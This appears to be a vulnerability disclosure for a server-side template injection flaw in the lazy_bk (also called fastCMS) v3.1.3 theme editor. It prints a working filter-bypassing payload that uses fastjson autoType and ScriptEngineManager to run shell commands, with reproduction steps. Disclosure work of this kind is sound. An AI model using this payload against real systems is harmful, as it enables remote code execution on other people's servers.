target:https://gitee.com/linping0124/lazy_bk version: v3.1.3   
There is a serious vulnerability in the fastCMS system. This vulnerability may lead to sensitive information leakage, code execution, GetShell, and other issues.  
There is a Server Side Template Injection vulnerability in the editing function of the theme management menu in the system.  
<img width="415" alt="image" src="https://github.com/biantaibao/lazy_bk_Sever-side-Template-injection/assets/131763503/bfbf3ed1-a6da-4a24-a23e-e9c2848224f2">  
However, there is some filtering involved, and using a regular payload will not trigger this vulnerability. We use fastJSON to assist in obtaining ScriptEngine Manager, and then execute any JavaScript code to achieve RCE. The payload is as follows:  


#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance())  
#(x.setAutoTypeSupport(true)) #(x.addAccept("javax.script.ScriptEngineManager"))   
#set(x=com.alibaba.fastjson.JSON::parse('{"@type":"javax.script.ScriptEngineManager"}'))  
#set(e=x.getEngineByName("js"))   
#(e.eval('java.lang.Runtime.getRuntime().exec("calc")'))  
base=#((java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager")).getEngineByExtension("js").eval("var s = [3];s[0] = \"/bin/bash\";  
          	s[1]=\"-c\";s[2] = \"id\";var p =java.lang.Runtime.getRuntime().exec(s);  
          	var sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\A\");  
          	var result = sc.hasNext() ? sc.next() : \"\";sc.close();result;"))    

Click edit, then copy the payload and click save.  
<img width="415" alt="image" src="https://github.com/biantaibao/lazy_bk_Sever-side-Template-injection/assets/131763503/84516656-03d0-4c27-8750-ac2b24016f37">  
Click the preview button.   
<img width="415" alt="image" src="https://github.com/biantaibao/lazy_bk_Sever-side-Template-injection/assets/131763503/ce42948f-daeb-44ce-a98f-59f288e8a8d0">  
Visit URL:http://127.0.0.1/?previewTheme=dolphin. Successfully triggered malicious code, ejected the computer, and successfully verified the vulnerability.  
![image](https://github.com/biantaibao/lazy_bk_Sever-side-Template-injection/assets/131763503/91ded936-0b30-4cfe-9592-c4ff7f331cb2)





